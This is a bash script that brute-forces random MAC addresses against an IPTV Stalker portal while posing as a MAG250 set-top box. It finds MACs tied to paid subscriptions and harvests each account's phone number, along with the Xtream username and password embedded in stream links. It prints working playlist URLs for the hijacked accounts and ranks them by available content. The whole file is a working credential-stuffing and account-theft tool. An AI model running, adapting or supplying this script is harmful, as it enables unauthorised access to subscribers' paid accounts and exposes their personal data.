#!/bin/bash

URL="${1%/}"

if [ -z "$URL" ]; then
    echo "Usage: $0 <portal-url>"
    exit 1
fi

RED="\033[0;31m"
GREEN="\033[0;32m"
YELLOW="\033[0;33m"
LIGHT_BLUE="\033[0;94m"
RESET="\033[0m"

echo -ne "Checking portal connectivity... "
http_code=$(curl -s -o /dev/null -w "%{http_code}" -L --max-time 10 \
  -H "User-Agent: $UA" \
  -H "Cookie: mac=00:1A:79:00:00:00; stb_lang=en; timezone=Europe/Amsterdam;" \
  "$URL/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml")
if [ "$http_code" = "000" ]; then
    echo -e "${RED}FAILED${RESET}"
    echo -e "${RED}Error: Cannot reach $URL (connection refused or timeout)${RESET}"
    exit 1
fi
echo -e "${GREEN}OK (HTTP $http_code)${RESET}"

read -p "$(echo -e "${YELLOW}How many MACs do you want to find? ${RESET}")" max_success_count
read -p "$(echo -e "${YELLOW}Parallel workers? [10] ${RESET}")" num_workers
num_workers=${num_workers:-10}

success_file=$(mktemp)
echo "0" > "$success_file"
hit_file=$(mktemp)


UA="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
hex=(0 1 2 3 4 5 6 7 8 9 A B C D E F)

scan_mac() {
  while true; do
    read current_count < "$success_file"
    ((current_count >= max_success_count)) && break

    prefixes=("00:1A:79" "00:1A:79" "00:1A:79")
    prefix="${prefixes[RANDOM%3]}"
    MAC="${prefix}:${hex[RANDOM%16]}${hex[RANDOM%16]}:${hex[RANDOM%16]}${hex[RANDOM%16]}:${hex[RANDOM%16]}${hex[RANDOM%16]}"
    echo -ne "scanning: $MAC\r"

    response=$(curl -s -i \
      -H "User-Agent: $UA" \
      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
      "$URL/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml")
    token=$(echo "$response" | grep -oP '(?<="token":")[^"]*')

    curl -s -o /dev/null \
      -H "User-Agent: $UA" \
      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=stb&action=get_profile&auth_second_step=1&hw_version_2=1635b1c3e68859923ab3bb72192e089f66e7dd9e&JsHttpRequest=1-xml"

    if ! echo "$response" | grep -q "200"; then
      echo -ne "scanning: $MAC ${RED}[connection failed, ratelimited?]${RESET}\r"
      continue
    fi

    genres=$(curl -s \
      -H "User-Agent: $UA" \
      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=itv&action=get_genres&JsHttpRequest=1-xml")

    if ! echo "$genres" | jq -e '.js[] | select(.title == "All")' > /dev/null 2>&1; then
      echo -ne "scanning: $MAC [connected but no subscriptions.]\r"
      continue
    fi

    main_info=$(curl -s \
      -H "User-Agent: $UA" \
      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml")
    mac_phone=$(echo "$main_info" | jq -r '.js | "\(.mac) [\(.phone)]"')

    ffplay=$(curl -s \
      -H "User-Agent: $UA" \
      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=itv&action=create_link&cmd=$channel&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml" \
      | jq -r 'try .js.cmd // .js[0].cmd // empty' 2>/dev/null | sed 's/^ffmpeg //')

    xtreamuser=$(echo "$ffplay" | awk -F/ '{print $4}')
    xtreampw=$(echo "$ffplay" | awk -F/ '{print $5}')

    check=$(curl -s "$URL/player_api.php?username=$xtreamuser&password=$xtreampw" | jq -r '.user_info')
    exp_date=$(echo "$check" | jq -r '.exp_date')
    max_connections=$(echo "$check" | jq -r '.max_connections')
    active_cons=$(echo "$check" | jq -r '.active_cons')

    live=$(curl -s \
      -H "User-Agent: $UA" \
      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=itv&action=get_ordered_list&genre=*&fav=0&sortby=name&p=1&JsHttpRequest=1-xml" \
      | jq -r 'try (.js.total_items // .js[0].total_items) // 0' 2>/dev/null)

    vod=$(curl -s \
      -H "User-Agent: $UA" \
      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=vod&action=get_ordered_list&category=*&sortby=added&fav=0&p=1&JsHttpRequest=1-xml" \
      | jq -r 'try (.js.total_items // .js[0].total_items) // 0' 2>/dev/null)

    series=$(curl -s \
      -H "User-Agent: $UA" \
      -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=series&action=get_ordered_list&category=*&sortby=added&fav=0&p=1&JsHttpRequest=1-xml" \
      | jq -r 'try (.js.total_items // .js[0].total_items) // 0' 2>/dev/null)

    {
      flock -x 200
      printf "\033[2K\rfound:    ${GREEN}%s${RESET}\n" "$mac_phone"
      [ -n "$exp_date" ] && [ "$exp_date" != "null" ] && \
        printf "${LIGHT_BLUE}  -> %s/get.php?username=%s&password=%s&type=m3u_plus [max=%s active=%s]${RESET}\n" \
          "$URL" "$xtreamuser" "$xtreampw" "$max_connections" "$active_cons"
      printf "%s|%s|%s|%s\n" "$MAC" "$live" "$vod" "$series" >> "$hit_file"
    } 200>"$success_file.lock"

    echo $((current_count + 1)) > "$success_file"
    read current_count < "$success_file"
    ((current_count >= max_success_count)) && { echo -e "${LIGHT_BLUE}Target reached: $max_success_count MACs found.${RESET}"; break; }
  done
}

pids=()
for ((i=0; i<num_workers; i++)); do
  scan_mac &
  pids+=($!)
done

show_summary() {
  printf "\033[2K\r"
  if [ -s "$hit_file" ]; then
    printf "\n${LIGHT_BLUE}Summary (sorted by total content):${RESET}\n"
    awk -F'|' '{print $2+$3+$4, $0}' "$hit_file" | sort -rn | cut -d' ' -f2- | while IFS='|' read -r mac live vod series; do
      printf "${LIGHT_BLUE}  ${GREEN}%s${LIGHT_BLUE}  Live TV: %s  VOD: %s  Series: %s${RESET}\n" "$mac" "$live" "$vod" "$series"
    done
  fi
  rm -f "$success_file" "$success_file.lock" "$hit_file"
}

trap 'kill "${pids[@]}" 2>/dev/null; wait "${pids[@]}" 2>/dev/null; show_summary; exit 1' INT TERM

wait
show_summary
